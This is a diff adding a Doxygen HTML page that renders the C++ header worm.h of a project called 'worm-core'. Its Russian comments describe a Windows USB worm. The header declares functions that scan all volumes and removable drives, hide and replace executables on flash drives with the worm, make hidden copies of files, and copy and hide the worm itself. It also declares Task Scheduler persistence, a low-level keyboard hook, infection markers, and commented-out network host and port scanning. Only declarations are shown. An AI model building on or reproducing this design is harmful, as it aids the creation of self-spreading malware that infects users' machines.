@@ -1,0 +1,246 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "https://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="ru">
+<head>
+<meta http-equiv="Content-Type" content="text/xhtml;charset=UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=11"/>
+<meta name="generator" content="Doxygen 1.9.8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1"/>
+<title>worm-core: Исходный файл include/worm.h</title>
+<link href="tabs.css" rel="stylesheet" type="text/css"/>
+<script type="text/javascript" src="jquery.js"></script>
+<script type="text/javascript" src="dynsections.js"></script>
+<link href="navtree.css" rel="stylesheet" type="text/css"/>
+<script type="text/javascript" src="resize.js"></script>
+<script type="text/javascript" src="navtreedata.js"></script>
+<script type="text/javascript" src="navtree.js"></script>
+<link href="search/search.css" rel="stylesheet" type="text/css"/>
+<script type="text/javascript" src="search/searchdata.js"></script>
+<script type="text/javascript" src="search/search.js"></script>
+<link href="doxygen.css" rel="stylesheet" type="text/css" />
+<link href="doxygen-awesome.css" rel="stylesheet" type="text/css"/>
+</head>
+<body>
+<div id="top"><!-- do not remove this div, it is closed by doxygen! -->
+<div id="titlearea">
+<table cellspacing="0" cellpadding="0">
+ <tbody>
+ <tr id="projectrow">
+  <td id="projectalign">
+   <div id="projectname">worm-core
+   </div>
+  </td>
+ </tr>
+ </tbody>
+</table>
+</div>
+<!-- end header part -->
+<!-- Создано системой Doxygen 1.9.8 -->
+<script type="text/javascript">
+/* @license magnet:?xt=urn:btih:d3d9a9a6595521f9666a5e94cc830dab83b65699&amp;dn=expat.txt MIT */
+var searchBox = new SearchBox("searchBox", "search/",'.html');
+/* @license-end */
+</script>
+<script type="text/javascript" src="menudata.js"></script>
+<script type="text/javascript" src="menu.js"></script>
+<script type="text/javascript">
+/* @license magnet:?xt=urn:btih:d3d9a9a6595521f9666a5e94cc830dab83b65699&amp;dn=expat.txt MIT */
+$(function() {
+  initMenu('',true,false,'search.php','Поиск');
+  $(document).ready(function() { init_search(); });
+});
+/* @license-end */
+</script>
+<div id="main-nav"></div>
+<script type="text/javascript">
+/* @license magnet:?xt=urn:btih:d3d9a9a6595521f9666a5e94cc830dab83b65699&amp;dn=expat.txt MIT */
+$(document).ready(function() { init_codefold(0); });
+/* @license-end */
+</script>
+</div><!-- top -->
+<div id="side-nav" class="ui-resizable side-nav-resizable">
+  <div id="nav-tree">
+    <div id="nav-tree-contents">
+      <div id="nav-sync" class="sync"></div>
+    </div>
+  </div>
+  <div id="splitbar" style="-moz-user-select:none;" 
+       class="ui-resizable-handle">
+  </div>
+</div>
+<script type="text/javascript">
+/* @license magnet:?xt=urn:btih:d3d9a9a6595521f9666a5e94cc830dab83b65699&amp;dn=expat.txt MIT */
+$(document).ready(function(){initNavTree('worm_8h_source.html',''); initResizable(); });
+/* @license-end */
+</script>
+<div id="doc-content">
+<!-- window showing the filter options -->
+<div id="MSearchSelectWindow"
+     onmouseover="return searchBox.OnSearchSelectShow()"
+     onmouseout="return searchBox.OnSearchSelectHide()"
+     onkeydown="return searchBox.OnSearchSelectKey(event)">
+</div>
+
+<!-- iframe showing the search results (closed by default) -->
+<div id="MSearchResultsWindow">
+<div id="MSearchResults">
+<div class="SRPage">
+<div id="SRIndex">
+<div id="SRResults"></div>
+<div class="SRStatus" id="Loading">Загрузка...</div>
+<div class="SRStatus" id="Searching">Поиск...</div>
+<div class="SRStatus" id="NoMatches">Не найдено</div>
+</div>
+</div>
+</div>
+</div>
+
+<div class="header">
+  <div class="headertitle"><div class="title">worm.h</div></div>
+</div><!--header-->
+<div class="contents">
+<a href="worm_8h.html">См. документацию.</a><div class="fragment"><div class="line"><a id="l00001" name="l00001"></a><span class="lineno">    1</span><span class="preprocessor">#pragma once</span></div>
+<div class="line"><a id="l00002" name="l00002"></a><span class="lineno">    2</span><span class="preprocessor">#include &lt;windows.h&gt;</span></div>
+<div class="line"><a id="l00003" name="l00003"></a><span class="lineno">    3</span><span class="preprocessor">#include &lt;string&gt;</span></div>
+<div class="line"><a id="l00004" name="l00004"></a><span class="lineno">    4</span><span class="preprocessor">#include &lt;vector&gt;</span></div>
+<div class="line"><a id="l00005" name="l00005"></a><span class="lineno">    5</span><span class="preprocessor">#include &lt;filesystem&gt;</span></div>
+<div class="line"><a id="l00006" name="l00006"></a><span class="lineno">    6</span><span class="preprocessor">#include &lt;iostream&gt;</span></div>
+<div class="line"><a id="l00007" name="l00007"></a><span class="lineno">    7</span><span class="preprocessor">#include &lt;chrono&gt;</span></div>
+<div class="line"><a id="l00008" name="l00008"></a><span class="lineno">    8</span><span class="preprocessor">#include &lt;random&gt;</span></div>
+<div class="line"><a id="l00009" name="l00009"></a><span class="lineno">    9</span><span class="preprocessor">#include &lt;locale&gt;</span></div>
+<div class="line"><a id="l00010" name="l00010"></a><span class="lineno">   10</span><span class="preprocessor">#include &lt;codecvt&gt;</span></div>
+<div class="line"><a id="l00011" name="l00011"></a><span class="lineno">   11</span><span class="preprocessor">#include &lt;Lmcons.h&gt;</span></div>
+<div class="line"><a id="l00012" name="l00012"></a><span class="lineno">   12</span><span class="preprocessor">#include &lt;shlobj.h&gt;</span></div>
+<div class="line"><a id="l00013" name="l00013"></a><span class="lineno">   13</span><span class="preprocessor">#include &lt;cstdlib&gt;</span> <span class="comment">// для wstring?</span></div>
+<div class="line"><a id="l00014" name="l00014"></a><span class="lineno">   14</span><span class="preprocessor">#include &lt;fstream&gt;</span>  <span class="comment">// для работы generate_loader_source</span></div>
+<div class="line"><a id="l00015" name="l00015"></a><span class="lineno">   15</span><span class="preprocessor">#include &lt;dbt.h&gt;</span> <span class="comment">// для обнаружения флешки при ее подключении</span></div>
+<div class="line"><a id="l00016" name="l00016"></a><span class="lineno">   16</span> </div>
+<div class="line"><a id="l00017" name="l00017"></a><span class="lineno">   17</span><span class="keyword">using namespace </span>std;</div>
+<div class="line"><a id="l00018" name="l00018"></a><span class="lineno">   18</span><span class="keyword">namespace </span>fs = std::filesystem;</div>
+<div class="line"><a id="l00019" name="l00019"></a><span class="lineno">   19</span> </div>
+<div class="line"><a id="l00020" name="l00020"></a><span class="lineno">   20</span> </div>
+<div class="line"><a id="l00021" name="l00021"></a><span class="lineno">   21</span>std::wstring <a class="code hl_function" href="worm_8h.html#a2a9891e8465acd30739680ba674795b5">get_own_path</a>();</div>
+<div class="line"><a id="l00022" name="l00022"></a><span class="lineno">   22</span>std::wstring <a class="code hl_function" href="worm_8h.html#a67e69358e6266c9bcc7569b491ad9b78">get_own_folder</a>();</div>
+<div class="line"><a id="l00023" name="l00023"></a><span class="lineno">   23</span>std::wstring <a class="code hl_function" href="worm_8h.html#a7f7d1574eb8de8b099ad44157c9d622f">get_drive_root_from_path</a>(<span class="keyword">const</span> std::wstring&amp; full_path);</div>
+<div class="line"><a id="l00024" name="l00024"></a><span class="lineno">   24</span><span class="keywordtype">bool</span> <a class="code hl_function" href="worm_8h.html#a70ac3d6c53eea5921020cd31f94d8cd9">is_hidden</a>(<span class="keyword">const</span> fs::path&amp; path);</div>
+<div class="line"><a id="l00025" name="l00025"></a><span class="lineno">   25</span> </div>
+<div class="line"><a id="l00026" name="l00026"></a><span class="lineno">   26</span><span class="comment">// Генератор случайных чисел</span></div>
+<div class="line"><a id="l00027" name="l00027"></a><span class="lineno">   27</span>wstring <a class="code hl_function" href="worm_8h.html#a139039a2dab4e82d2c66051b55e682c3">generate_unique_suffix</a>();</div>
+<div class="line"><a id="l00028" name="l00028"></a><span class="lineno">   28</span>vector&lt;wstring&gt; <a class="code hl_function" href="worm_8h.html#a8d4c144a2215b68282c59e716c452811">get_removable_volume_paths</a>(); <span class="comment">// поиск всех съемных носителей</span></div>
+<div class="line"><a id="l00029" name="l00029"></a><span class="lineno">   29</span><span class="keywordtype">void</span> <a class="code hl_function" href="worm_8h.html#a0fa582bed0bb149e4824409e971a0d2c">filter_only_exe</a>(vector&lt;fs::path&gt;&amp; files); <span class="comment">// фильтруем из всех файлов, только exe</span></div>
+<div class="line"><a id="l00030" name="l00030"></a><span class="lineno">   30</span><span class="comment">//LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam); // для обнаружения флешки после запуска червя</span></div>
+<div class="line"><a id="l00031" name="l00031"></a><span class="lineno">   31</span><span class="keywordtype">void</span> <a class="code hl_function" href="worm_8h.html#ac4c5e45f63797a19094e21af2ffc622c">attach_console</a>();</div>
+<div class="line"><a id="l00032" name="l00032"></a><span class="lineno">   32</span> </div>
+<div class="line"><a id="l00033" name="l00033"></a><span class="lineno">   33</span>wstring <a class="code hl_function" href="worm_8h.html#a30c54d8d378e04c33669ab521183c6e5">get_username</a>();</div>
+<div class="line"><a id="l00034" name="l00034"></a><span class="lineno">   34</span>vector&lt;wstring&gt; <a class="code hl_function" href="worm_8h.html#ae2b9df655505f5f3c72e22468f277778">get_all_volumes</a>();</div>
+<div class="line"><a id="l00035" name="l00035"></a><span class="lineno">   35</span>vector&lt;wstring&gt; <a class="code hl_function" href="worm_8h.html#a51c4bcf05323f5477701fd1c737496f7">get_paths_for_volume</a>(<span class="keyword">const</span> wstring&amp; volumeName);</div>
+<div class="line"><a id="l00036" name="l00036"></a><span class="lineno">   36</span> </div>
+<div class="line"><a id="l00037" name="l00037"></a><span class="lineno">   37</span><span class="comment">// удалить</span></div>
+<div class="line"><a id="l00039" name="l00039"></a><span class="lineno">   39</span><span class="comment">//vector&lt;wstring&gt; get_local_ip_and_subnet(); // находим маску и внутренний айпишник хоста </span></div>
+<div class="line"><a id="l00040" name="l00040"></a><span class="lineno">   40</span><span class="comment">//vector&lt;wstring&gt; generate_ip_range(const string&amp; ip, const string&amp; mask); // по маске и айпи создаем вектор всех возможных хостов в нашей сети</span></div>
+<div class="line"><a id="l00041" name="l00041"></a><span class="lineno">   41</span><span class="comment">//bool is_host_alive(const std::wstring&amp; ip); // проверка айпишника на работоспособность</span></div>
+<div class="line"><a id="l00042" name="l00042"></a><span class="lineno">   42</span><span class="comment">//bool is_port_open(const std::wstring&amp; ip, int port, int timeout_ms = 200); // проверка айпишников на открытые порты</span></div>
+<div class="line"><a id="l00043" name="l00043"></a><span class="lineno">   43</span> </div>
+<div class="foldopen" id="foldopen00044" data-start="{" data-end="};">
+<div class="line"><a id="l00044" name="l00044"></a><span class="lineno"><a class="line" href="classworm.html">   44</a></span><span class="keyword">class </span><a class="code hl_class" href="classworm.html">worm</a></div>
+<div class="line"><a id="l00045" name="l00045"></a><span class="lineno">   45</span>{</div>
+<div class="line"><a id="l00046" name="l00046"></a><span class="lineno">   46</span><span class="keyword">private</span>:</div>
+<div class="line"><a id="l00047" name="l00047"></a><span class="lineno">   47</span> </div>
+<div class="line"><a id="l00048" name="l00048"></a><span class="lineno"><a class="line" href="classworm.html#ab8c387f770e73de36eba37ff005a523a">   48</a></span>    wstring <a class="code hl_variable" href="classworm.html#ab8c387f770e73de36eba37ff005a523a">path_to_start</a>;</div>
+<div class="line"><a id="l00049" name="l00049"></a><span class="lineno"><a class="line" href="classworm.html#adcf2716aaf578ac65ef8b1169e1fb98a">   49</a></span>    vector &lt;wstring&gt; <a class="code hl_variable" href="classworm.html#adcf2716aaf578ac65ef8b1169e1fb98a">list_dir</a>;</div>
+<div class="line"><a id="l00050" name="l00050"></a><span class="lineno"><a class="line" href="classworm.html#a1023713ae09f70251e761c4f1b8e9842">   50</a></span>    vector &lt;fs::path&gt; <a class="code hl_variable" href="classworm.html#a1023713ae09f70251e761c4f1b8e9842">file_to_copy</a>;</div>
+<div class="line"><a id="l00051" name="l00051"></a><span class="lineno"><a class="line" href="classworm.html#a71d71929058459310a08d0f48b730f5c">   51</a></span>    <span class="keywordtype">int</span> <a class="code hl_variable" href="classworm.html#a71d71929058459310a08d0f48b730f5c">iteration</a>;</div>
+<div class="line"><a id="l00052" name="l00052"></a><span class="lineno"><a class="line" href="classworm.html#a2b1613c60a6f5818ed6352785de8c9b0">   52</a></span>    vector &lt;fs::path&gt; <a class="code hl_variable" href="classworm.html#a2b1613c60a6f5818ed6352785de8c9b0">exe_on_the_flash_drive</a>;</div>
+<div class="line"><a id="l00053" name="l00053"></a><span class="lineno">   53</span> </div>
+<div class="line"><a id="l00054" name="l00054"></a><span class="lineno">   54</span><span class="keyword">public</span>:</div>
+<div class="line"><a id="l00055" name="l00055"></a><span class="lineno">   55</span> </div>
+<div class="foldopen" id="foldopen00056" data-start="{" data-end="}">
+<div class="line"><a id="l00056" name="l00056"></a><span class="lineno"><a class="line" href="classworm.html#a7ad5ab184d432520ee1b82bf23e3c273">   56</a></span>    <a class="code hl_function" href="classworm.html#a7ad5ab184d432520ee1b82bf23e3c273">worm</a>(<span class="keyword">const</span> wstring&amp; <a class="code hl_variable" href="classworm.html#ab8c387f770e73de36eba37ff005a523a">path_to_start</a> = <a class="code hl_function" href="worm_8h.html#a67e69358e6266c9bcc7569b491ad9b78">get_own_folder</a>(), <span class="keywordtype">int</span> <a class="code hl_variable" href="classworm.html#a71d71929058459310a08d0f48b730f5c">iteration</a> = 2)</div>
+<div class="line"><a id="l00057" name="l00057"></a><span class="lineno">   57</span>        : <a class="code hl_variable" href="classworm.html#ab8c387f770e73de36eba37ff005a523a">path_to_start</a>(<a class="code hl_variable" href="classworm.html#ab8c387f770e73de36eba37ff005a523a">path_to_start</a>), <a class="code hl_variable" href="classworm.html#a71d71929058459310a08d0f48b730f5c">iteration</a>(<a class="code hl_variable" href="classworm.html#a71d71929058459310a08d0f48b730f5c">iteration</a>) {};</div>
+</div>
+<div class="line"><a id="l00058" name="l00058"></a><span class="lineno">   58</span> </div>
+<div class="line"><a id="l00059" name="l00059"></a><span class="lineno">   59</span>    </div>
+<div class="line"><a id="l00060" name="l00060"></a><span class="lineno">   60</span> </div>
+<div class="line"><a id="l00061" name="l00061"></a><span class="lineno">   61</span>    <span class="comment">// Добавим статический указатель для доступа из WndProc</span></div>
+<div class="line"><a id="l00062" name="l00062"></a><span class="lineno"><a class="line" href="classworm.html#a5c57218df05398306f04701d7031a268">   62</a></span>    <span class="keyword">static</span> <a class="code hl_class" href="classworm.html">worm</a>* <a class="code hl_variable" href="classworm.html#a5c57218df05398306f04701d7031a268">instance</a>;</div>
+<div class="line"><a id="l00063" name="l00063"></a><span class="lineno">   63</span>    <span class="comment">// Метод для запуска окна мониторинга</span></div>
+<div class="line"><a id="l00064" name="l00064"></a><span class="lineno">   64</span>    <span class="keywordtype">int</span> <a class="code hl_function" href="classworm.html#a8aa30cd3ef280bd98c58ee284215de4e">run_device_monitor</a>(HINSTANCE hInstance);</div>
+<div class="line"><a id="l00065" name="l00065"></a><span class="lineno">   65</span> </div>
+<div class="line"><a id="l00066" name="l00066"></a><span class="lineno">   66</span> </div>
+<div class="line"><a id="l00067" name="l00067"></a><span class="lineno">   67</span>    <span class="keywordtype">void</span> <a class="code hl_function" href="classworm.html#ad7efd123369771d90bf6de71c9bb2e34">worm_was_started</a>();<span class="comment">// Massage Box для отладки</span></div>
+<div class="line"><a id="l00068" name="l00068"></a><span class="lineno">   68</span>    <span class="keywordtype">void</span> <a class="code hl_function" href="classworm.html#a8617c96fb26b8e4e3cdc0c3bd3ed42cc">worm_was_end</a>();</div>
+<div class="line"><a id="l00069" name="l00069"></a><span class="lineno">   69</span>    <span class="keywordtype">void</span> <a class="code hl_function" href="classworm.html#a0ff6df52cd8b661b110d90dfa901c05f">scan_all_volumes</a>();</div>
+<div class="line"><a id="l00070" name="l00070"></a><span class="lineno">   70</span>    <span class="keywordtype">void</span> <a class="code hl_function" href="classworm.html#a25fbb59515545da462fc6653ddddd220">search_list_dir</a>(<span class="keyword">const</span> wstring&amp; path_to_dir, vector&lt;wstring&gt;&amp; list_dir_tmp);<span class="comment">// рекурсивный поиск всех подпапок по адрессу и внутри и копирование в выбранный вектор</span></div>
+<div class="line"><a id="l00071" name="l00071"></a><span class="lineno">   71</span>    <span class="keywordtype">void</span> <a class="code hl_function" href="classworm.html#a25fbb59515545da462fc6653ddddd220">search_list_dir</a>();<span class="comment">// для старта поиска по дирректориям</span></div>
+<div class="line"><a id="l00072" name="l00072"></a><span class="lineno">   72</span>    <span class="keywordtype">void</span> <a class="code hl_function" href="classworm.html#a4ce454d6714e84af770404239ffe4a83">print_list_dir</a>();<span class="comment">// вывод всех найденных папок, в которых будет копирование</span></div>
+<div class="line"><a id="l00073" name="l00073"></a><span class="lineno">   73</span>    <span class="keywordtype">void</span> <a class="code hl_function" href="classworm.html#a8b311a7460b2679b98a888f82058f853">collect_visible_files</a>(); <span class="comment">// тот же отбор, только без параметров ( чтобы использовать без указания пути, для запуска червя )</span></div>
+<div class="line"><a id="l00074" name="l00074"></a><span class="lineno">   74</span>    <span class="keywordtype">void</span> <a class="code hl_function" href="classworm.html#a8b311a7460b2679b98a888f82058f853">collect_visible_files</a>(<span class="keyword">const</span> vector&lt;wstring&gt;&amp; list_dir_tmp, vector&lt;fs::path&gt;&amp; collected_files);<span class="comment">// функция отбирающая только видимые файлы в определенный вектор, чтобы потом копировать все что в нем есть</span></div>
+<div class="line"><a id="l00075" name="l00075"></a><span class="lineno">   75</span>    <span class="keywordtype">void</span> <a class="code hl_function" href="classworm.html#ab4cb670ff776230ae58edbb0f6180c33">print_file_to_copy</a>(); <span class="comment">// выводит все файлы которые собирается копировать</span></div>
+<div class="line"><a id="l00076" name="l00076"></a><span class="lineno">   76</span>    <span class="keywordtype">void</span> <a class="code hl_function" href="classworm.html#a3573a34c1621d0647a61dc57f26c8010">replicate_files</a>(); <span class="comment">// вызов копирования без параметров </span></div>
+<div class="line"><a id="l00077" name="l00077"></a><span class="lineno">   77</span>    <span class="keywordtype">void</span> <a class="code hl_function" href="classworm.html#a3573a34c1621d0647a61dc57f26c8010">replicate_files</a>(<span class="keywordtype">int</span> <a class="code hl_variable" href="classworm.html#a71d71929058459310a08d0f48b730f5c">iteration</a> = 1);<span class="comment">// создает скрытые копии из вектора поля file_to_copy в те же папки </span></div>
+<div class="line"><a id="l00078" name="l00078"></a><span class="lineno">   78</span>    <span class="keywordtype">void</span> <a class="code hl_function" href="classworm.html#a76c3b4645ef75ea7d659724988b85992">copy_and_hide_worm</a>();<span class="comment">// чтобы добавить в таск менеджер, желательно перекопировать червя в какую-то безопасную папку</span></div>
+<div class="line"><a id="l00079" name="l00079"></a><span class="lineno">   79</span>    <span class="keywordtype">void</span> <a class="code hl_function" href="classworm.html#a7708c41d98e2cbf611648beeb35a2fd1">create_scheduled_task</a>(<span class="keyword">const</span> wstring&amp; worm_path); <span class="comment">// создаем через Task Scheduler автозапуск червя при входе пользователя в систему ( путь указываем к текущему exe )</span></div>
+<div class="line"><a id="l00080" name="l00080"></a><span class="lineno">   80</span>    <span class="keywordtype">void</span> <a class="code hl_function" href="classworm.html#ae1c68fe22a03b237af35bd3ad07aff60">process_all_removable_disks</a>(); <span class="comment">// проходимся по всем съемным носителям</span></div>
+<div class="line"><a id="l00081" name="l00081"></a><span class="lineno">   81</span>    <span class="keywordtype">void</span> <a class="code hl_function" href="classworm.html#a5c6fd7c664c7aed871bed9996face781">hide_and_replace_exe</a>(<span class="keyword">const</span> fs::path&amp; target_exe, <span class="keyword">const</span> std::wstring&amp; worm_path);</div>
+<div class="line"><a id="l00082" name="l00082"></a><span class="lineno">   82</span>    <span class="keywordtype">bool</span> <a class="code hl_function" href="classworm.html#a3787890ffdbba5fdf65c75c88900113b">possible_to_write</a>(<span class="keyword">const</span> wstring&amp; dir_path); <span class="comment">// функция проверяет возможность создавать файлы в папке</span></div>
+<div class="line"><a id="l00083" name="l00083"></a><span class="lineno">   83</span>    <span class="keywordtype">bool</span> <a class="code hl_function" href="classworm.html#a974f4fb1351f4c630e69358f8bb0fd37">infected_dir</a>(<span class="keyword">const</span> wstring&amp; dir_path); <span class="comment">// создаем файл, чтобы не заражать флкшку несколько раз</span></div>
+<div class="line"><a id="l00084" name="l00084"></a><span class="lineno">   84</span>    <span class="keywordtype">bool</span> <a class="code hl_function" href="classworm.html#aec72ce7fad91e6166b08b25c21947a6d">dir_was_infected</a>(<span class="keyword">const</span> wstring&amp; dir_path); <span class="comment">// проверка на заражение</span></div>
+<div class="line"><a id="l00085" name="l00085"></a><span class="lineno">   85</span>    <span class="keywordtype">bool</span> <a class="code hl_function" href="classworm.html#a37daa5ac85a5f7078615b07abd287f7d">is_system_path</a>(<span class="keyword">const</span> std::wstring&amp; path); <span class="comment">// проверка на системную папку</span></div>
+<div class="line"><a id="l00086" name="l00086"></a><span class="lineno">   86</span> </div>
+<div class="line"><a id="l00087" name="l00087"></a><span class="lineno">   87</span>    <span class="keyword">static</span> LRESULT CALLBACK <a class="code hl_function" href="classworm.html#a2ec126413cce931b6d2716f9dc438082">LowLevelKeyboardProc</a>(<span class="keywordtype">int</span> nCode, WPARAM wParam, LPARAM lParam);</div>
+<div class="line"><a id="l00088" name="l00088"></a><span class="lineno"><a class="line" href="classworm.html#a45d92a6590b3a8c3b7acd6516ca28220">   88</a></span>    <span class="keyword">static</span> HHOOK <a class="code hl_variable" href="classworm.html#a45d92a6590b3a8c3b7acd6516ca28220">keyboardHook</a>;</div>
+<div class="line"><a id="l00089" name="l00089"></a><span class="lineno">   89</span> </div>
+<div class="line"><a id="l00090" name="l00090"></a><span class="lineno">   90</span> </div>
+<div class="line"><a id="l00091" name="l00091"></a><span class="lineno">   91</span>    </div>
+<div class="line"><a id="l00092" name="l00092"></a><span class="lineno">   92</span> </div>
+<div class="line"><a id="l00093" name="l00093"></a><span class="lineno">   93</span>};</div>
+</div>
+<div class="line"><a id="l00094" name="l00094"></a><span class="lineno">   94</span> </div>
+<div class="ttc" id="aclassworm_html"><div class="ttname"><a href="classworm.html">worm</a></div><div class="ttdef"><b>Definition</b> worm.h:45</div></div>
+<div class="ttc" id="aclassworm_html_a0ff6df52cd8b661b110d90dfa901c05f"><div class="ttname"><a href="classworm.html#a0ff6df52cd8b661b110d90dfa901c05f">worm::scan_all_volumes</a></div><div class="ttdeci">void scan_all_volumes()</div><div class="ttdef"><b>Definition</b> worm.cpp:223</div></div>
+<div class="ttc" id="aclassworm_html_a1023713ae09f70251e761c4f1b8e9842"><div class="ttname"><a href="classworm.html#a1023713ae09f70251e761c4f1b8e9842">worm::file_to_copy</a></div><div class="ttdeci">vector&lt; fs::path &gt; file_to_copy</div><div class="ttdef"><b>Definition</b> worm.h:50</div></div>
+<div class="ttc" id="aclassworm_html_a25fbb59515545da462fc6653ddddd220"><div class="ttname"><a href="classworm.html#a25fbb59515545da462fc6653ddddd220">worm::search_list_dir</a></div><div class="ttdeci">void search_list_dir()</div><div class="ttdef"><b>Definition</b> worm.cpp:336</div></div>
+<div class="ttc" id="aclassworm_html_a2b1613c60a6f5818ed6352785de8c9b0"><div class="ttname"><a href="classworm.html#a2b1613c60a6f5818ed6352785de8c9b0">worm::exe_on_the_flash_drive</a></div><div class="ttdeci">vector&lt; fs::path &gt; exe_on_the_flash_drive</div><div class="ttdef"><b>Definition</b> worm.h:52</div></div>
+<div class="ttc" id="aclassworm_html_a2ec126413cce931b6d2716f9dc438082"><div class="ttname"><a href="classworm.html#a2ec126413cce931b6d2716f9dc438082">worm::LowLevelKeyboardProc</a></div><div class="ttdeci">static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)</div><div class="ttdef"><b>Definition</b> worm.cpp:694</div></div>
+<div class="ttc" id="aclassworm_html_a3573a34c1621d0647a61dc57f26c8010"><div class="ttname"><a href="classworm.html#a3573a34c1621d0647a61dc57f26c8010">worm::replicate_files</a></div><div class="ttdeci">void replicate_files()</div><div class="ttdef"><b>Definition</b> worm.cpp:408</div></div>
+<div class="ttc" id="aclassworm_html_a3787890ffdbba5fdf65c75c88900113b"><div class="ttname"><a href="classworm.html#a3787890ffdbba5fdf65c75c88900113b">worm::possible_to_write</a></div><div class="ttdeci">bool possible_to_write(const wstring &amp;dir_path)</div><div class="ttdef"><b>Definition</b> worm.cpp:247</div></div>
+<div class="ttc" id="aclassworm_html_a37daa5ac85a5f7078615b07abd287f7d"><div class="ttname"><a href="classworm.html#a37daa5ac85a5f7078615b07abd287f7d">worm::is_system_path</a></div><div class="ttdeci">bool is_system_path(const std::wstring &amp;path)</div><div class="ttdef"><b>Definition</b> worm.cpp:271</div></div>
+<div class="ttc" id="aclassworm_html_a45d92a6590b3a8c3b7acd6516ca28220"><div class="ttname"><a href="classworm.html#a45d92a6590b3a8c3b7acd6516ca28220">worm::keyboardHook</a></div><div class="ttdeci">static HHOOK keyboardHook</div><div class="ttdef"><b>Definition</b> worm.h:88</div></div>
+<div class="ttc" id="aclassworm_html_a4ce454d6714e84af770404239ffe4a83"><div class="ttname"><a href="classworm.html#a4ce454d6714e84af770404239ffe4a83">worm::print_list_dir</a></div><div class="ttdeci">void print_list_dir()</div><div class="ttdef"><b>Definition</b> worm.cpp:346</div></div>
+<div class="ttc" id="aclassworm_html_a5c57218df05398306f04701d7031a268"><div class="ttname"><a href="classworm.html#a5c57218df05398306f04701d7031a268">worm::instance</a></div><div class="ttdeci">static worm * instance</div><div class="ttdef"><b>Definition</b> worm.h:62</div></div>
+<div class="ttc" id="aclassworm_html_a5c6fd7c664c7aed871bed9996face781"><div class="ttname"><a href="classworm.html#a5c6fd7c664c7aed871bed9996face781">worm::hide_and_replace_exe</a></div><div class="ttdeci">void hide_and_replace_exe(const fs::path &amp;target_exe, const std::wstring &amp;worm_path)</div><div class="ttdef"><b>Definition</b> worm.cpp:529</div></div>
+<div class="ttc" id="aclassworm_html_a71d71929058459310a08d0f48b730f5c"><div class="ttname"><a href="classworm.html#a71d71929058459310a08d0f48b730f5c">worm::iteration</a></div><div class="ttdeci">int iteration</div><div class="ttdef"><b>Definition</b> worm.h:51</div></div>
+<div class="ttc" id="aclassworm_html_a76c3b4645ef75ea7d659724988b85992"><div class="ttname"><a href="classworm.html#a76c3b4645ef75ea7d659724988b85992">worm::copy_and_hide_worm</a></div><div class="ttdeci">void copy_and_hide_worm()</div><div class="ttdef"><b>Definition</b> worm.cpp:453</div></div>
+<div class="ttc" id="aclassworm_html_a7708c41d98e2cbf611648beeb35a2fd1"><div class="ttname"><a href="classworm.html#a7708c41d98e2cbf611648beeb35a2fd1">worm::create_scheduled_task</a></div><div class="ttdeci">void create_scheduled_task(const wstring &amp;worm_path)</div><div class="ttdef"><b>Definition</b> worm.cpp:478</div></div>
+<div class="ttc" id="aclassworm_html_a7ad5ab184d432520ee1b82bf23e3c273"><div class="ttname"><a href="classworm.html#a7ad5ab184d432520ee1b82bf23e3c273">worm::worm</a></div><div class="ttdeci">worm(const wstring &amp;path_to_start=get_own_folder(), int iteration=2)</div><div class="ttdef"><b>Definition</b> worm.h:56</div></div>
+<div class="ttc" id="aclassworm_html_a8617c96fb26b8e4e3cdc0c3bd3ed42cc"><div class="ttname"><a href="classworm.html#a8617c96fb26b8e4e3cdc0c3bd3ed42cc">worm::worm_was_end</a></div><div class="ttdeci">void worm_was_end()</div><div class="ttdef"><b>Definition</b> worm.cpp:120</div></div>
+<div class="ttc" id="aclassworm_html_a8aa30cd3ef280bd98c58ee284215de4e"><div class="ttname"><a href="classworm.html#a8aa30cd3ef280bd98c58ee284215de4e">worm::run_device_monitor</a></div><div class="ttdeci">int run_device_monitor(HINSTANCE hInstance)</div><div class="ttdef"><b>Definition</b> worm.cpp:625</div></div>
+<div class="ttc" id="aclassworm_html_a8b311a7460b2679b98a888f82058f853"><div class="ttname"><a href="classworm.html#a8b311a7460b2679b98a888f82058f853">worm::collect_visible_files</a></div><div class="ttdeci">void collect_visible_files()</div><div class="ttdef"><b>Definition</b> worm.cpp:353</div></div>
+<div class="ttc" id="aclassworm_html_a974f4fb1351f4c630e69358f8bb0fd37"><div class="ttname"><a href="classworm.html#a974f4fb1351f4c630e69358f8bb0fd37">worm::infected_dir</a></div><div class="ttdeci">bool infected_dir(const wstring &amp;dir_path)</div><div class="ttdef"><b>Definition</b> worm.cpp:568</div></div>
+<div class="ttc" id="aclassworm_html_ab4cb670ff776230ae58edbb0f6180c33"><div class="ttname"><a href="classworm.html#ab4cb670ff776230ae58edbb0f6180c33">worm::print_file_to_copy</a></div><div class="ttdeci">void print_file_to_copy()</div><div class="ttdef"><b>Definition</b> worm.cpp:400</div></div>
+<div class="ttc" id="aclassworm_html_ab8c387f770e73de36eba37ff005a523a"><div class="ttname"><a href="classworm.html#ab8c387f770e73de36eba37ff005a523a">worm::path_to_start</a></div><div class="ttdeci">wstring path_to_start</div><div class="ttdef"><b>Definition</b> worm.h:48</div></div>
+<div class="ttc" id="aclassworm_html_ad7efd123369771d90bf6de71c9bb2e34"><div class="ttname"><a href="classworm.html#ad7efd123369771d90bf6de71c9bb2e34">worm::worm_was_started</a></div><div class="ttdeci">void worm_was_started()</div><div class="ttdef"><b>Definition</b> worm.cpp:111</div></div>
+<div class="ttc" id="aclassworm_html_adcf2716aaf578ac65ef8b1169e1fb98a"><div class="ttname"><a href="classworm.html#adcf2716aaf578ac65ef8b1169e1fb98a">worm::list_dir</a></div><div class="ttdeci">vector&lt; wstring &gt; list_dir</div><div class="ttdef"><b>Definition</b> worm.h:49</div></div>
+<div class="ttc" id="aclassworm_html_ae1c68fe22a03b237af35bd3ad07aff60"><div class="ttname"><a href="classworm.html#ae1c68fe22a03b237af35bd3ad07aff60">worm::process_all_removable_disks</a></div><div class="ttdeci">void process_all_removable_disks()</div><div class="ttdef"><b>Definition</b> worm.cpp:508</div></div>
